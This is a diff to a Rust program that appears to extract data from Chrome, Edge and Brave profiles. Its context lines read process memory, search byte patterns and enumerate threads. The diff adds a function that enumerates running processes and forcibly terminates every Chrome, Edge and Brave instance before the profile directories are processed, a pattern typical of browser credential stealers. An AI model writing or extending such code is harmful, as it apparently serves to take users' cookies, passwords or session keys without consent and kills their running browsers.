@@ -312,6 +312,12 @@ fn main() {
         },
     ];
 
+    unsafe {
+        kill_processes_by_name("chrome.exe");
+        kill_processes_by_name("msedge.exe");
+        kill_processes_by_name("brave.exe");
+    }
+
     for config in configs {
         let user_data_dir = match get_user_data_dir(config.user_data_subdir) {
             Some(d) => d,
@@ -515,6 +521,33 @@ fn read_process_memory_chunk(h_process: HANDLE, addr: *const std::ffi::c_void, s
 
 fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
     haystack.windows(needle.len()).position(|window| window == needle)
+}
+
+unsafe fn kill_processes_by_name(target_name: &str) {
+    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if snapshot != INVALID_HANDLE_VALUE {
+        let mut pe: PROCESSENTRY32W = zeroed();
+        pe.dwSize = size_of::<PROCESSENTRY32W>() as u32;
+
+        if Process32FirstW(snapshot, &mut pe) != 0 {
+            loop {
+                let exe_name = String::from_utf16_lossy(&pe.szExeFile);
+                let exe_name = exe_name.trim_matches('\0');
+                if exe_name.eq_ignore_ascii_case(target_name) {
+                    let h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if h_process != 0 {
+                        TerminateProcess(h_process, 0);
+                        CloseHandle(h_process);
+                    }
+                }
+
+                if Process32NextW(snapshot, &mut pe) == 0 {
+                    break;
+                }
+            }
+        }
+        CloseHandle(snapshot);
+    }
 }
 
 unsafe fn get_all_threads(process_id: u32) -> Vec<u32> {
